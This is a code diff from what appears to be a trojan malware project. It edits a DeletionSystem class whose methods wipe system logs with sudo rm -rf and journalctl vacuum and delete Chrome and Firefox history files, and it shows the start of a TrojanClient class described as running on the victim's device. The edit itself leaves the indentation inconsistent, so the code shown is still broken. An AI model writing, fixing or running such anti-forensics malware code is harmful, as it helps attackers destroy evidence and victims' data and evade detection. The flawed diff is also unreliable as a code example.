@@ -97,26 +97,33 @@ class DeletionSystem:
  def __init__(self):
      self.deleted_files = []
         
- def scrub_logs(self):
+def scrub_logs(self):
         """Uses shell commands to delete logs."""
-        commands = ["sudo rm -rf /var/log/syslog", "sudo journalctl --rotate", "sudo journalctl --vacuum-time=1s"]
+        commands = [
+            "sudo rm -rf /var/log/syslog",
+            "sudo journalctl --rotate",
+            "sudo journalctl --vacuum-time=1s"
+        ]
         for cmd in commands:
             try:
                 subprocess.run(cmd, shell=True, check=True)
                 self.deleted_files.append(cmd)
-            except subprocess.CalledProcessError: # <--- Syntax error occurs here
-                print(f"[SYS] Failed to run {cmd}")
+            except subprocess.CalledProcessError as e:
+                print(f"[SYS] Failed to run {cmd}. Exit code: {e.returncode}")
 
- def clear_browsing_history(self):
-     """Cleans browser history and cache."""
-     paths = ["~/.config/google-chrome/Default/History", "~/.mozilla/firefox/*.sqlite"]
-     for path in paths:
-         try:
-             subprocess.run(["rm", "-f", path], shell=True, check=True)
-             self.deleted_files.append(path)
-except Exception:
-     pass
-
+    def clear_browsing_history(self):
+        """Cleans browser history and cache."""
+        paths = [
+            "~/.config/google-chrome/Default/History",
+            "~/.mozilla/firefox/*.sqlite"
+        ]
+        for path in paths:
+            try:
+                subprocess.run(["rm", "-f", path], shell=True, check=True)
+                self.deleted_files.append(path)
+            except Exception:
+                pass
+   
 class TrojanClient:
  """The agent that runs on the victim's device."""
  def __init__(self, server_ip: str, server_port: int):
